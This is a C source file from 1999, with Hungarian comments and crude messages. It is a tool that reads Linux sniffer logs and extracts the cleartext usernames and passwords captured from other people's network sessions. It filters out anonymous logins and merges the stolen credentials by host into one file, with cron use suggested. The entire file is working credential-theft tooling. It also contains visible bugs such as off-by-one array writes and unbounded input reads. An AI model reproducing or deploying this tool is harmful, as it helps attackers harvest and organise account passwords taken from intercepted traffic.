/***************************************************************************
                          analized.c  -  description
                             -------------------
    begin                : Sat Nov 20 21:39:36 CET 1999
    copyright            : (C) 1999 by cyrax
    email                : cyrax@swi.hu
 ***************************************************************************
              usage: ./analized tcp.log analized.log
 ***************************************************************************
 *                                                                         *
 *           A program 1 szabvany linsniffer logjat analizalja             *
 *           felteve ha a snif logban igy neznek ki a dolgok :             *
 *            bela.anyad.hu => kabbe.a.faszom.com [110]                    *
 *            USER bela                                                    *
 *            PASS anyad                                                   *
 *          /ilyen pl a rootshellrol letoltheto linsiff.c  /               *
 *       ha a 1 host ra 1 usernek tobb passa is van a logfileben akkor     *
 *       akkor az mindet elmenti /mer a faszom sem tudja melik a joh :)/   *
 *-------------------------------------------------------------------------*
 *             es amivel tobbet tud elodjenel :                            *
 *    megadhatsz neki 1 mar analizalt filet is igy pl cronatabba is be     *
 *    lehet tenni de a fo elonye hogy nem kell orizgetni a 10 -15 megas    *
 *    logokat a progi a tcp.log-bol es a mar reggeben analizalt filebol    *
 *    csinal 1 ujat az analized.log-ba mely minden user/passt tartalmaz    *
 *    es termeszetesen mindent csak 1*                                     *
             
 
 

***************************************************************************/

#define B  "\033[1;30m"
#define R  "\033[1;31m"
#define G  "\033[1;32m"
#define Y  "\033[1;33m"
#define U  "\033[1;34m"
#define M  "\033[1;35m"
#define C  "\033[1;36m"
#define W  "\033[1;37m"
#define DR "\033[0;31m"
#define DG "\033[0;32m"
#define DY "\033[0;33m"
#define DU "\033[0;34m"
#define DM "\033[0;35m"
#define DC "\033[0;36m"
#define DW "\033[0;37m"
#define RESTORE "\33[0;0m"
#define CLEAR "\033[0;0H\033[J"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

struct record {
                        char host[100] ;
                        struct USER {
                                     char login[100] ;
                                     char pass[100] ;
                                     struct USER * kov ;
                                     } * user ;
                        struct record *kov ;
                } ;


struct record * uj , * akt, * eloz, * start ;
struct USER * uuj, * uakt, * ueloz ;

typedef struct USER UUSER;
typedef struct record rrecord;

int rend();

main (int argc, char * argv[]) {

char ihost[100];
char iuser[100];
char ipass[100];
FILE * fp , * fp2 , * fp3;
int i ,j ,k ;
char ch , chel ;
char path[100], szo[5] ;

/* ego rlz :) */
printf("%s",CLEAR);
printf("\n\n      %scyrax %s L%si%sn%su%sx %ssniffer %s log %sanalizer%s
%s[%s28%s|%s12%s|%s99%s]%s\n",R,W,B,W,U,G,U,B,DW,B,DC,DY,DC,DY,DC,DY,DC,RESTORE);
printf("%s             v %s1%s.%s2  %scode by
%scyrax%s\n",G,R,B,R,DU,W,RESTORE);
printf("%s              email  %scyrax@swi.hu%s\n\n\n",R,G,RESTORE);

uj=akt=eloz=start=NULL;
uuj=uakt=ueloz=NULL;
fp=fp2=NULL;
i=argc;
if (i == 2 ) { printf("%s%s    Ha mar igy akkarod inditani akkor ./analized
tcp.log analized.log\n",CLEAR,R); return; }
while ( fp == NULL ) { 
                     if ( i < 2  ) {
                                   printf("%s   Hun van a file bazzeg?
%s",DC,RESTORE);
                                   scanf("%s",&path);
                                   }
                     else strcpy(path,argv[1]);
                     fp = fopen(path,"rt");
                     if (fp == NULL ) printf("%s        [%s%s%s] %s Hat ott
nincs bazzeg!\n",DY,G,path,DY,R);
                     i=1;
                     }
if (strcmp(argv[2],"analized.log") ==0) fp3 = fopen("analized.log","rt") ;
else if ((strcmp(argv[2],"analized.log") !=0) && ((fp3 =
fopen("analized.log","rt")) != NULL )) { 
                                       printf("\n   %s    A konyvatarban mar
van 1 analized.log file !\n",U);
                                       printf("   %s    Orulnel neki hogyha
ezt supportolnam?\n",U);
                                       while ( (ch != 'i') && (ch !='n')) {
                                       printf("\n    %s   i/n
:%s",Y,RESTORE);
                                       if (argc < 3 ) scanf("%c",&ch);
                                       scanf("%c",&ch);
                                       }

}
printf("\n");
if (fp3 == NULL) j=2; 
if (ch == 'i') {
                k=1; 
                fp2=fp3;
               }
if (ch == 'n') { 
                 printf("      %s hule vagy te ba+ , el fog veszni!
:)\n\n",R) ;
                 k=0;
               }
ch='\0';
if (( argc < 3 ) && (k !=1) ) {
  if (!((j != 2) || (k ==1))) printf("       %sVan valahol 1 regebbi
analized log file amit supportolni kene? ",G) ; 
  else printf("       %sesetleg mashol van ilyen file?\n",G);
  while ( (ch != 'i') && (ch !='n')) {
                               printf("\n   %s    i/n :%s",Y,RESTORE);
                               scanf("%c",&ch);
                               scanf("%c",&ch);
                                   }      
                               } 
if ( ch == 'i' || argc >=3 || k==1 )  { 
 i=argc; 
 while ( fp2 == NULL ) {
                          if ( i < 3 ) {
                                    printf("\n%s       Nah es hon a rákba ba
van az a file?%s  ",R,RESTORE);
                                    scanf("%s",&path);
                                       }
                          else strcpy(path,argv[2]);
                          if (!(fp2 = fopen(path,"rt"))) printf("   %s
[%s%s%s] %s Hat ott nincs bazzeg!\n",DY,G,path,DY,R);
                          i=1; 
                          }
  for ( i=0 ; i<=100;  ) ihost[i++]='\0';
  for ( i=0 ; i<=100;  ) iuser[i++]='\0';
  for ( i=0 ; i<=100;  ) ipass[i++]='\0';
  while ( (fp2 != NULL ) && (!feof(fp2))) { 
  j=k=0;
  while ( (!feof(fp2)) && (j==0) ){
         fscanf(fp2,"%c",&ch);
         switch (ch) {
         case 'H' : {
                        fscanf(fp2,"%3s",&szo);
                        if (strcmp(szo,"OST\0") != 0 )  break ;
                        i=0;
                        fscanf(fp2,"%3s",&szo);
                        fscanf(fp2,"%s",&ihost);
                        if (feof(fp2)) j++ ;
                        break;
                     }

         case 'u' : {
                      fscanf(fp2,"%4s",&szo);
                      if (strcmp(szo,"ser:\0") != 0 ) break;
                      fscanf(fp2,"%c",&ch);
                      fscanf(fp2,"%s",&iuser);
                      if (feof(fp2)) j++ ;
                      break;
                      }

         case 'p' : {
                      fscanf(fp2,"%4s",&szo);
                      if (strcmp(szo,"ass:\0") != 0 ) break;
                      fscanf(fp2,"%c",&ch);
                      fscanf(fp2,"%s",&ipass);
                      j++;
                      break;
                    }
          default  : {
                       if (feof(fp2)) j++ ;
                       break ;
                     }
              }
         } 
    if (feof(fp2)) continue ;
    if ( (ihost[2] != '\0') && (iuser[2] != '\0') && (ipass[2] != '\0') &&
(strcmp(iuser,"mp3") !=0 ) && ( strcmp(iuser,"guest") != 0 ) &&
(strcmp(iuser,"anonymus") != 0 )  && (strcmp(iuser,"anonymous") !=0 ) &&
(strcmp(ipass,"-----") != 0 ) && (strcmp(iuser,"ftp") != 0) &&
(strcmp(iuser,"anonymous") !=0 ))
    rend(ihost,iuser,ipass);
    iuser[2]='\0';
    ipass[2]='\0';
}
}

for ( i=0 ; i<=100;  ) ihost[i++]='\0';
for ( i=0 ; i<=100;  ) iuser[i++]='\0';
for ( i=0 ; i<=100;  ) ipass[i++]='\0';

while (!feof(fp)) {
 j=k=0;
 fscanf(fp,"%c",&ch);

 while ( (!feof(fp)) && (j==0) ){
         fscanf(fp,"%c",&ch);
         switch (ch) {
         case '=' : {
                      fscanf(fp,"%c",&ch);
                      if (ch != '>') break ;
                      i=0;
                      fscanf(fp,"%c",&ch);
                      fscanf(fp,"%s",&ihost);
                      if (feof(fp)) j++ ;
                      break;
                    }

         case 'U' : {
                      fscanf(fp,"%3s",&szo);
                      if (strcmp(szo,"SER\0") != 0 ) break;
                      fscanf(fp,"%c",&ch);
                      fscanf(fp,"%s",&iuser);
                      if (feof(fp)) j++ ;
                      break;
                    }

         case 'P' : {
                      fscanf(fp,"%3s",&szo);
                      if (strcmp(szo,"ASS\0") != 0 ) break;
                      fscanf(fp,"%c",&ch);
                      fscanf(fp,"%s",&ipass);
                      j++;
                      break;
                    }
          default  : {
                       if (feof(fp)) j++ ;
                       break ;
                     }
              }
         }
    if (feof(fp)) continue ;
    if ( (ihost[2] != '\0') && (iuser[2] != '\0') && (ipass[2] != '\0') &&
(strcmp(iuser,"mp3") !=0 ) && ( strcmp(iuser,"guest") != 0 ) &&
(strcmp(iuser,"anonymus") != 0 ) && (strcmp(iuser,"anonymous") !=0 )
&&(strcmp(ipass,"-----") != 0 ) && (strcmp(iuser,"ftp") != 0) &&
(strcmp(iuser,"anonymous") !=0 ))
    rend(ihost,iuser,ipass);
    ihost[2]='\0';
    iuser[2]='\0';
    ipass[2]='\0';

}

if (fp3 != NULL) fclose(fp3);
if (fp2 != NULL) fclose(fp2);
if (fp != NULL) fclose(fp);


fp=NULL;
fp=fopen("analized.log","w+t");
eloz=start;
akt=start->kov;
fprintf(fp,"\n\n       cyrax sniffer log analizer output file\n
v 1.2 \n\n               email: cyrax@swi.hu\n\n\n " );
while (akt->kov != NULL) {
                     fprintf(fp,"\n HOST : %s\n\n",akt->host);
                     uakt=akt->user;
                     i=0;
                     while (uakt != NULL) {
                                           fprintf(fp,"    %d.\n",++i);
                                           fprintf(fp,"     user: %s\n
pass: %s\n",uakt->login,uakt->pass);
                                           ueloz=uakt;
                                           uakt=uakt->kov;
                                           free(ueloz);
                                          }
                     eloz=akt;
                     akt=akt->kov;
                     free(eloz);
                    }
fflush(fp);
fclose(fp);

printf("%s      allz done ...%s\n",DM,RESTORE);
printf("%s                       thx geci              %s ® %scyrax
\n",G,DR,B,RESTORE);
}



/* rend fugveny */
int rend (char uhost[100],char uuser[100],char upass[100])
{
        int i,j,k ;
        char ch;


if ( start ==  NULL) {
if (!(start=(rrecord *)malloc(sizeof(rrecord)))) { printf ("Nincs eleg
memoria bazzeg !"); exit ;}
if (!(uj=(rrecord *)malloc(sizeof(rrecord)))) { printf ("Nincs eleg memoria
bazzeg !") ; exit ; }
if (!(eloz=(rrecord *)malloc(sizeof(rrecord)))) {printf ("Nincs eleg memoria
bazzeg !") ; exit ; }
if (!(uuj=(UUSER *)malloc(sizeof(UUSER)))) { printf ("Nincs eleg memoria
bazzeg !"); exit ; }
start->kov=uj;
uj->user=uuj;
uuj->kov=NULL;
eloz->kov=NULL;
eloz->user=NULL;
uj->kov=eloz;
for ( i = 0 ; uuser[i]!='\0' ; i++) uuj->login[i]=uuser[i];
for ( i = 0 ; upass[i]!='\0' ; i++) uuj->pass[i]=upass[i];
for ( i = 0 ; uhost[i]!='\0' ; i++) uj->host[i]=uhost[i];
return ;
}

eloz=start;
akt=start->kov;

while ( (akt->kov != NULL ) && (strcmp(akt->host,uhost) < 0) )
    {
     eloz=akt;
     akt=akt->kov;
    }
if ((strcmp(akt->host,uhost)) == 0 )
         { /* ha mar van ilyen host a lanccban */

            uakt=akt->user;
             /*  uj login/pass beszurasa */
            while ( (uakt->kov != NULL) && (strcmp(uakt->login,uuser) != 0)
) uakt=uakt->kov;
            if (uakt->kov != NULL ) {
                             ueloz=uakt->kov;
                             while ( (uakt->kov != NULL ) &&
(strcmp(uakt->login,ueloz->login) == 0 )) {
                                                            if (
(strcmp(uakt->login,uuser) == 0 ) && (strcmp(uakt->pass,upass) == 0) )
return -1 ;
                                                            uakt=uakt->kov;
                                                            ueloz=uakt->kov;
                                                            }
                                  }
                  /* ha mar van ilyen loginev a lanccban */
                  /* es a pass is 1ezik : kilep a function */
           if ( (strcmp(uakt->login,uuser) == 0 ) &&
(strcmp(uakt->pass,upass) == 0) ) return -1 ;
           /* ha meg nincs ilyen login/pass a lancban */
           if (!(uuj=(UUSER *)malloc(sizeof(UUSER)))) { printf ("Nincs eleg
memoria bazzeg !"); exit -1 ; }
           for ( i = 0 ; uuser[i]!='\0' ; i++) uuj->login[i]=uuser[i];
           for ( i = 0 ; upass[i]!='\0' ; i++) uuj->pass[i]=upass[i];
           /* linkeles a lancba */
           uuj->kov=uakt->kov;
           uakt->kov=uuj;
           return 1; /* kilepes a funcitonbol */

          }
       /* Nincs meg ilyen host a lancban */
       /* uj elem beszurasa a host lancba */
       if (!(uj=(rrecord *)malloc(sizeof(rrecord)))){ printf ("Nincs eleg
memoria bazzeg !"); exit -1 ; } /* memoria lefoglalasa */
       if (!(uuj=(UUSER *)malloc(sizeof(UUSER)))) { printf ("Nincs eleg
memoria bazzeg !"); exit -1 ; }
       uj->user=uuj;
       /* elem feltoltese */
       for ( i = 0 ; uhost[i]!='\0' ; i++) uj->host[i]=uhost[i];
       for ( i = 0 ; uuser[i]!='\0' ; i++) uj->user->login[i]=uuser[i];
       for ( i = 0 ; upass[i]!='\0' ; i++) uj->user->pass[i]=upass[i];
       /* belinekles a lancba */
       uj->kov=akt;
       eloz->kov=uj;
       return 1; /* kilepes a funcitonbol */

}